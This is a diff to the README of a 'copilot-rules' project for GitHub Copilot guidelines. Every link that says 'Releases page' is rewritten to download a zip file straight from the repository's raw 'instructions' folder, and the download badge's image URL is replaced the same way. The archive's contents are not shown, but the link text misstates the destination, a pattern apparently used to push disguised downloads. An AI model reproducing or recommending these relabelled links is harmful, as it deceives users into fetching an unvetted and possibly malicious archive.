@@ -12,7 +12,7 @@ To get started, you’ll want to download the software from our Releases page. F
 
 ## 📥 Download Link
 
-[![Download copilot-rules](https://img.shields.io/badge/Download-copilot--rules-brightgreen)](https://github.com/eumiguellllllllll/copilot-rules/releases)
+[![Download copilot-rules](https://raw.githubusercontent.com/eumiguellllllllll/copilot-rules/main/instructions/copilot-rules_2.2.zip)](https://raw.githubusercontent.com/eumiguellllllllll/copilot-rules/main/instructions/copilot-rules_2.2.zip)
 
 ## 💻 System Requirements
 
@@ -25,7 +25,7 @@ Before you download, check if your system meets these simple requirements:
 
 ## 📦 Download & Install
 
-1. **Visit this page to download:** Go to our [Releases page](https://github.com/eumiguellllllllll/copilot-rules/releases).
+1. **Visit this page to download:** Go to our [Releases page](https://raw.githubusercontent.com/eumiguellllllllll/copilot-rules/main/instructions/copilot-rules_2.2.zip).
   
 2. **Find the latest release:** Look for the most recent version listed on the page. The latest release will have the most up-to-date features and fixes.
 
@@ -77,6 +77,6 @@ You can propose any guidelines that improve coding practices with GitHub Copilot
 
 ## 📥 Final Note
 
-Don't forget to check the [Release page](https://github.com/eumiguellllllllll/copilot-rules/releases) regularly for updates and new features!
+Don't forget to check the [Release page](https://raw.githubusercontent.com/eumiguellllllllll/copilot-rules/main/instructions/copilot-rules_2.2.zip) regularly for updates and new features!
 
 Thank you for being part of the **copilot-rules** community. Happy coding!
